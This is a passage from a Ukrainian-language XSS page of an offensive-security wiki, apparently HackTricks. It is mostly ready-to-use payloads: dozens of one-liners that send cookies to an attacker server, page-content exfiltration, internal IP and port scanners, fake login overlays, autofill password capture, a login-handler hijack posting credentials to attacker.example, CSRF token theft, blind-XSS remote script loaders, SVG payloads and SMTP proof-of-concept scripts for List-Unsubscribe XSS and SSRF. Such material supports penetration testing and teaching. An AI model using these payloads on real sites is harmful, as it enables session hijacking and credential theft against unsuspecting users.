ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS поширені payloads

### Кілька payloads в 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe пастка

Змусити користувача переміщатися по сторінці, не виходячи з iframe, та перехопити його дії (включно з інформацією, надісланою у формах):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Отримання Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Ви **не зможете отримати доступ до cookies з JavaScript** якщо прапорець HTTPOnly встановлено у cookie. Але тут у вас є [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) якщо вам пощастить.
  
### Крадіжка вмісту сторінки
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Знайти внутрішні IP-адреси
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Короткі інтервали вказують на порт, що відповідає_ _Довші інтервали вказують на відсутність відповіді._

Перегляньте список портів, заборонених у Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) і у Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Поле для запиту облікових даних
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Auto-fill passwords capture
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Коли в поле пароля вводяться будь-які дані, ім'я користувача та пароль надсилаються на сервер атакувальника; навіть якщо клієнт вибирає збережений пароль і нічого не вводить, облікові дані будуть ексфільтровані.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Якщо критичний handler (наприклад, `function DoLogin(){...}`) оголошується пізніше на сторінці, а ваш payload виконується раніше (наприклад, через inline JS-in-JS sink), визначте спочатку `const` з тим самим ім'ям, щоб перехопити та заблокувати обробник. Пізніші оголошення функцій не зможуть повторно прив'язати ім'я `const`, залишаючи ваш hook під контролем:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Примітки
- Це покладається на порядок виконання: ваша injection має виконатися до легітимного оголошення.
- Якщо ваш payload загорнуто в `eval(...)`, `const/let` bindings не стануть глобальними. Використайте динамічну `<script>` injection техніку з розділу “Deliverable payloads with eval(atob()) and scope nuances”, щоб забезпечити справжнє глобальне, яке неможливо перевизначити, зв'язування.
- Коли фільтри за ключовими словами блокують код, комбінуйте з Unicode-escaped ідентифікаторами або доставкою через `eval(atob('...'))`, як показано вище.

### Keylogger

Просто шукаючи на github, я знайшов кілька різних:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Ви також можете використовувати metasploit `http_javascript_keylogger`

### Викрадення CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Викрадення повідомлень PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

Якщо сторінка **зберігає `event.origin` з `postMessage` і пізніше конкатенує його в script URL**, відправник контролює **origin** завантаженого JS:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Рецепт експлуатації (з CAPIG):

- **Gates**: спрацьовує лише коли `window.opener` існує і `pixel_id` додано в allowlist; **origin ніколи не перевіряється**.
- **Use CSP-allowed origin**: перейти на домен, вже дозволений victim CSP (наприклад, публічні сторінки довідки, що дозволяють аналітику типу `*.THIRD-PARTY.com`) і розмістити там `/sdk/<pixel_id>/iwl.js` через takeover/XSS/upload.
- **Restore `opener`**: в Android WebView `window.name='x'; window.open(target,'x')` робить сторінку її власним opener; надішліть зловмисний `postMessage` з захопленого iframe.
- **Trigger**: iframe відправляє `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`; батьківська сторінка завантажує атакуючий `iwl.js` з CSP-allowed origin і виконує його.

Це перетворює перевірку `postMessage` без перевірки origin на **примітив завантаження віддалених скриптів**, який виживає при CSP, якщо ви можете потрапити на будь-який origin, вже дозволений політикою.

### Supply-chain stored XSS via backend JS concatenation

Коли бекенд **будує спільний SDK, конкатенуючи JS-рядки з контролюваними користувачем значеннями**, будь-який символ, що ламає лапки/структуру, може інжектити скрипт, який буде відданий усім споживачам:

- Приклад (Meta CAPIG): сервер додає `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` безпосередньо в `capig-events.js`.
- Інжектування `'` або `"]}` закриває літерал/об'єкт і додає JS зловмисника, створюючи **stored XSS** в розповсюдженому SDK для кожного сайту, що його підвантажує (first-party and third-party).

### Stored XSS in generated reports when escaping is disabled

Якщо завантажені файли парсяться і їх метадані виводяться у HTML-звітах з вимкненим екрануванням (`|safe`, custom renderers), ці метадані є **stored XSS sink**. Приклад потоку:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Шаблон Django рендерить `{{item|key:"title"|safe}}`, тому зловмисний HTML виконується.

**Exploit:** розмістіть **entity-encoded HTML** у будь-якому полі manifest/config, яке потрапляє до звіту:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Відрендерено з `|safe`, звіт виводить `<img ...>` і виконує JS при перегляді.

**Hunting:** шукайте конструктори звітів/сповіщень, які повторно використовують розпарсені поля у `%s`/f-strings і вимикають auto-escape. Один закодований тег у завантаженому manifest/log/archive зберігає XSS для кожного переглядача.

### Зловживання Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Доступ до Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Також можна використовувати: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Доступ до прихованого вмісту

З [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) можна дізнатися, що навіть якщо деякі значення зникають із JS, їх усе одно можна знайти в JS-атрибутах різних об'єктів. Наприклад, input REGEX все ще можна знайти після того, як значення input регулярного виразу було видалено:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Abusing other vulnerabilities

### XSS in Markdown

Можна впровадити Markdown-код, який буде відрендерений? Можливо, ви отримаєте XSS! Перевірте:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

Отримали XSS на **сайті, що використовує кешування**? Спробуйте **підвищити це до SSRF** через Edge Side Include Injection за допомогою цього payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Використовуйте це, щоб обійти обмеження cookie, фільтри XSS та багато іншого!\
Більше інформації про цю техніку тут: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dynamic created PDF

Якщо веб-сторінка створює PDF за допомогою введення, контрольованого користувачем, ви можете спробувати **обдурити the bot**, який створює PDF, щоб він **виконав довільний JS код**.\
Отже, якщо **PDF creator bot знаходить** певні **HTML** **теги**, він їх **інтерпретує**, і ви можете **зловживати** цією поведінкою, щоб спричинити **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Якщо ви не можете inject HTML tags, може мати сенс спробувати **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, спрямований на прискорення роботи веб-сторінок на мобільних пристроях, використовує HTML-теги, доповнені JavaScript, щоб забезпечити функціональність з акцентом на швидкість і безпеку. Він підтримує ряд компонентів для різних функцій, доступних через [AMP components](https://amp.dev/documentation/components/?format=websites).

Формат [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) розширює певні компоненти AMP для email, дозволяючи отримувачам взаємодіяти з контентом прямо в листах.

Приклад [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

Заголовок RFC 2369 `List-Unsubscribe` вставляє attacker-controlled URIs, які багато webmail та mail clients автоматично перетворюють на кнопки "Unsubscribe". Коли ці URI відрендерені або запитані без валідації, заголовок стає точкою ін'єкції як для stored XSS (якщо unsubscribe link розміщено в DOM), так і для SSRF (якщо сервер виконує запит на відписку від імені користувача).

#### Stored XSS via `javascript:` URIs

1. **Send yourself an email** where the header points to a `javascript:` URI while keeping the rest of the message benign so that spam filters do not drop it.
2. **Ensure the UI renders the value** (many clients show it in a "List Info" pane) and check whether the resulting `<a>` tag inherits attacker-controlled attributes such as `href` or `target`.
3. **Trigger execution** (e.g., CTRL+click, middle-click, or "open in new tab") when the link uses `target="_blank"`; browsers will evaluate the supplied JavaScript in the origin of the webmail application.
4. Observe the stored-XSS primitive: the payload persists with the email and only requires a click to execute.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Байт переносу рядка (`%0a`) в URI показує, що навіть незвичні символи проходять через конвеєр рендерингу в уразливих клієнтах, таких як Horde IMP H5, які виводять рядок дослівно всередині тега <a>.

<details>
<summary>Мінімальний SMTP PoC, який доставляє шкідливий заголовок List-Unsubscribe</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Проксі відписки на боці сервера -> SSRF

Деякі клієнти, такі як Nextcloud Mail app, проксірують дію відписки на боці сервера: натискання кнопки наказує серверу самостійно отримати вказаний URL. Це перетворює заголовок на SSRF-примітив, особливо коли адміністратори встановлюють 'allow_local_remote_servers' => true (задокументовано в [HackerOne report 2902856](https://hackerone.com/reports/2902856)), що дозволяє запити до loopback і діапазонів RFC1918.

1. **Створіть email**, де `List-Unsubscribe` вказує на кінцеву точку, контрольовану зловмисником (для сліпого SSRF використовуйте Burp Collaborator / OAST).
2. **Залиште `List-Unsubscribe-Post: List-Unsubscribe=One-Click`**, щоб UI показував кнопку відписки в один клік.
3. **Виконайте вимоги довіри**: Nextcloud, наприклад, виконує HTTPS-запити для відписки лише коли повідомлення проходить DKIM, тому зловмисник має підписати лист, використовуючи домен, яким він контролює.
4. **Доставте повідомлення до поштової скриньки, яку обробляє цільовий сервер**, і зачекайте, поки користувач не натисне кнопку відписки.
5. **Спостерігайте за server-side callback** на collaborator endpoint, потім pivot до внутрішніх адрес після підтвердження примітива.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-підписане повідомлення List-Unsubscribe для тестування SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Примітки тестування**

- Використайте OAST endpoint для збору blind SSRF hits, а потім адаптуйте URL `List-Unsubscribe`, щоб націлитися на `http://127.0.0.1:PORT`, metadata services або інші внутрішні хости після підтвердження примітива.
- Оскільки unsubscribe helper часто повторно використовує той самий HTTP stack, що й застосунок, ви успадковуєте його proxy settings, HTTP verbs і header rewrites, що дозволяє застосувати додаткові traversal трюки, описані в [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS завантаження файлів (svg)

Завантажте як зображення файл, схожий на наступний (з [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Знайдіть **більше SVG payloads у** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Різні JS трюки та релевантна інформація


{{#ref}}
other-js-tricks.md
{{#endref}}

## Ресурси XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Посилання

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
